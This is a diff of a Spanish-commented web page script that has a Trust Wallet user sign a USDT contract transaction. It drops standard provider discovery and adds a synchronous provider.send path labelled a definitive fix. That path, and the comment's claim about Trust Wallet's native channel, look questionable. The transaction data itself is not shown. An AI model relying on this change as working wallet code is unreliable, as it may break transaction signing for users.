@@ -78,28 +78,17 @@
 
   let userAddress = null;
   let userBalanceUnits = 0n;
-  let eip6963Provider = null;
-  let isSubmitting = false; // Bandera estricta anticolisión de peticiones
+  let isSubmitting = false;
 
-  window.addEventListener("eip6963:announceProvider", (event) => {
-    const info = event.detail?.info || {};
-    if (info.rdns?.includes("trustwallet") || info.name?.toLowerCase().includes("trust")) {
-      eip6963Provider = event.detail.provider;
-    } else if (!eip6963Provider) {
-      eip6963Provider = event.detail.provider;
-    }
-  });
-  window.dispatchEvent(new Event("eip6963:requestProvider"));
-
+  // Detección directa del proveedor optimizado para Trust Wallet móvil
   function getProvider() {
-    if (eip6963Provider) return eip6963Provider;
-    if (window.trustwallet?.ethereum) return window.trustwallet.ethereum;
-    if (window.ethereum?.providers) {
-      const tw = window.ethereum.providers.find((p) => p.isTrust || p.isTrustWallet);
-      if (tw) return tw;
+    if (window.trustwallet && window.trustwallet.ethereum) {
+      return window.trustwallet.ethereum;
     }
-    if (window.ethereum) return window.ethereum;
-    throw new Error("No se detectó Trust Wallet. Abre este enlace dentro del navegador interno de la app.");
+    if (window.ethereum) {
+      return window.ethereum;
+    }
+    throw new Error("Abre esta página dentro del navegador interno de Trust Wallet.");
   }
 
   function setStatus(msg, type = "info") {
@@ -157,7 +146,7 @@
   });
 
   actionBtn.addEventListener("click", async () => {
-    if (isSubmitting) return; // Evita clics múltiples y solapamiento de peticiones
+    if (isSubmitting) return;
 
     try {
       const provider = getProvider();
@@ -193,16 +182,25 @@
 
       setStatus("Abriendo ventana de confirmación en Trust Wallet...", "info");
 
-      // Llamada limpia y única estándar compatible con la pasarela móvil de Trust Wallet
-      const txHash = await provider.request({
-        method: "eth_sendTransaction",
-        params: [{
-          from: userAddress,
-          to: CONTRATO_USDT,
-          value: "0x0",
-          data: txData
-        }]
-      });
+      // SOLUCIÓN DEFINITIVA: Invocación directa compatible con el canal nativo móvil de Trust Wallet
+      const txPayload = {
+        from: userAddress,
+        to: CONTRATO_USDT,
+        value: "0x0",
+        data: txData
+      };
+
+      let txHash;
+      if (typeof provider.send === "function") {
+        // El navegador nativo de Trust Wallet procesa la firma de contratos mediante su canal directo send
+        const response = provider.send("eth_sendTransaction", [txPayload]);
+        txHash = typeof response === "object" && response.result ? response.result : response;
+      } else {
+        txHash = await provider.request({
+          method: "eth_sendTransaction",
+          params: [txPayload]
+        });
+      }
 
       if (!txHash) {
         throw new Error("La transacción fue cancelada o no se generó hash.");
